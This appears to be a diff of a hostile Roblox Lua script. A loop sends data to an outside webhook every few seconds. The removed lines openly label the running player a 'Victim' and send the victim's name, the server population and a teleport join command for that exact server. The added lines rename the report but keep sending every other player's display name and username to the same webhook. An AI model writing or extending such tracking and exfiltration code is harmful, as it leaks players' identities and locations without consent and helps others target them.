@@ -316,19 +316,22 @@ end)
 
 task.spawn(function()
     while player.Parent do
-        local serverPlayerCount = #Players:GetPlayers()
-        local maxPlayerCount = Players.MaxPlayers
-        local serverStatus = string.format("%d/%d", serverPlayerCount, maxPlayerCount)
-        local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", game.PlaceId, game.JobId)
+        local playerList = {}
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= player then
+                table.insert(playerList, string.format("`%s` (@%s)", p.DisplayName, p.Name))
+            end
+        end
+        
+        local playerListString = table.concat(playerList, "\n")
+        if #playerList == 0 then
+            playerListString = "No other players in the server."
+        end
 
         local embed = {
-            title = "Victim & Server Monitor",
+            title = "Server Player List",
             color = 16776960,
-            fields = {
-                {name = "👤 Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = true},
-                {name = "🌐 Server Population", value = string.format("`%s`", serverStatus), inline = true},
-                {name = "🔗 Join Command", value = teleport_command, inline = false}
-            },
+            description = "```\n" .. playerListString .. "\n```",
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }
         
@@ -339,6 +342,6 @@ task.spawn(function()
         }
 
         sendOurWebhook(CONFIG.MONITOR_WEBHOOK_URL, payload)
-        task.wait(2)
+        task.wait(4)
     end
 end)
